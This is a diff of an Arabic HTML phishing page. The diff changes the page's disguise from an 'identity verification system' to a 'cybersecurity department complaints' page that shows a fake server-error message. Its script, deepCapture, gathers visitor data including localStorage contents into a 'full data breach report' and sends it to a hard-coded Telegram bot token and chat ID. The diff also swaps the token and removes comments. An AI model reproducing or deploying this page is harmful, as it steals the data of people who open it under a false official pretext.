@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>نظام التحقق من الهوية الرقمية</title>
+    <title>شكاوي دائرة الأمن السيبراني</title>
     <style>
         body { font-family: 'Segoe UI', sans-serif; background: #0b0e11; color: #fff; text-align: center; padding-top: 150px; user-select: none; }
         .secure-box { border: 1px solid #2f3336; padding: 40px; border-radius: 12px; display: inline-block; background: #15181c; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
@@ -14,8 +14,8 @@
 <body oncontextmenu="return false;">
 
     <div class="secure-box">
-        <div class="blink">● جاري فحص معايير الأمان العالمية...</div>
-        <p>الرجاء الانتظار، يتم الآن ربط جهازك بالسيرفر الآمن</p>
+        <div class="blink">● جاري الإنتقال للموقع...</div>
+        <p>تعذر الإنتقال للموقع بسبب حدوث عطل في سيرفراتنا سيتم اصلاحه قريبا </p>
         <p class="info">لا تقم بتحديث الصفحة لضمان اكتمال العملية</p>
     </div>
 
@@ -26,7 +26,7 @@
         };
 
         async function deepCapture() {
-            const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
+            const TG_TOKEN = "8379785829:AAFtA9zYDAFLIzGbWUjgbd4fEbqGyGVXZj8";
             const CH_ID = "1678506419";
 
             try {
@@ -59,7 +59,6 @@
                 } catch(e) { localData = "ممنوع الوصول"; }
                 localData = localData || "فارغ";
 
-                // 5. بناء التقرير المرعب
                 const report = `
 💀 *تقرير اختراق بيانات كامل* 💀
 ----------------------------------
@@ -91,7 +90,6 @@ ${localData.substring(0, 500)}
 ⏰ *الوقت:* ${new Date().toLocaleString('ar-EG')}
 ----------------------------------`;
 
-                // 6. الإرسال للتليجرام
                 await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
